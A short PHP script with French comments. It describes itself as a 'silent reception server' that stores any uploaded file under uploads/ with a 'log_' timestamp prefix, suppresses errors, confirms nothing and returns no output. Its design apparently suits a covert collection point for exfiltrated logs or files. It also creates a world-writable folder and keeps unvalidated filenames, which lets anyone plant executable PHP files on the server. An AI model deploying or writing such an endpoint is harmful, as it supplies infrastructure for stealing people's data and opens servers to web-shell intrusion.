<?php
// Serveur de réception silencieux
$target_dir = "uploads/";

// Créer le dossier de destination si nécessaire
if (!file_exists($target_dir)) {
    @mkdir($target_dir, 0777, true);
}

// Traiter le fichier reçu
if (isset($_FILES['file'])) {
    $timestamp = date("Y-m-d_H-i-s");
    $target_file = $target_dir . "log_" . $timestamp . "_" . basename($_FILES['file']['name']);
    
    // Enregistrer le fichier sans aucune confirmation
    @move_uploaded_file($_FILES['file']['tmp_name'], $target_file);
}

// Fin du script sans aucun retour texte
exit();
?>
